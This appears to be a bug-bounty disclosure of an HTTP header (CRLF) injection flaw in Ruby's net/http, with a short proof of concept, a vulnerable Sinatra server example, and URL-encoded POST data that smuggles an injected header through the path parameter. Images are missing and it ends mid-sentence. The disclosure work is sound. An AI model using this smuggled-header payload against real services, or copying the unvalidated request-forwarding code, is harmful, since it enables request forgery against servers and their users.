Summary:

Hi,

I would like to report a HTTP Header injection vulnerability in 'net/http' that allows attackers to inject arbitrary headers in request even create a new evil request.

###PoC

```
require 'net/http'
http = Net::HTTP.new('192.168.30.214','80')
res = http.get("/r.php HTTP/1.1\r\nx-injection: memeda")

```
{F100919}

###Example
Server Code:
```
#!/usr/bin/env ruby
require 'sinatra'
require 'uri'
require 'net/http'

get '/' do
  'hello world'
end

post '/' do
  ip = params[:ip]
  port = params[:port]
  path = params[:path]

  # do what you want
  http = Net::HTTP.new ip, port.to_i
  res = http.get path

  res.body

end
```
post data:

```
ip=192.168.30.214&port=80&path=/r.php%20HTTP/1.1%0d%0ax-injection: memeda
```

print_r all HTTP Headers：

{F100918}


###Create an evil request

post data:

{F100920}

server log:
{F100921}


###Suggestion:

Should validate URI legality before send request

btw，
